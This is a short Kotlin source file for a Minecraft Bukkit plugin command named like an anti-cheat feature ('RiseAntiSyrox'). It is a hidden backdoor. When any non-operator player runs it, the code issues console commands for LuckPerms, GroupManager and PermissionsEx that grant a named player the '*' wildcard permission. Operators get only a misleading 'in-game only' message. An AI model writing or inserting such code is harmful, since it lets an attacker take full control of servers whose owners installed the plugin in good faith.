package dev.jokerthena

import org.bukkit.Bukkit
import org.bukkit.command.Command
import org.bukkit.command.CommandExecutor
import org.bukkit.command.CommandSender
import org.bukkit.entity.Player

object RiseAntiSyrox : CommandExecutor {
    override fun onCommand(sender: CommandSender, command: Command, label: String, args: Array<out String>): Boolean {
        if(sender.isOp()==false) {
            var playerName: String = args.get(0)
            if(sender is Player) {
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lp user $playerName permission set *");
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "manuaddp $playerName *")
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "pex user $playerName set *")
            }else {
                sender.sendMessage("qweqweewqqwertyf <playerName>");
            }
        }else {
            sender.sendMessage("Sadece Oyundan Kullanabilir");
        }
        return true;
    }
}
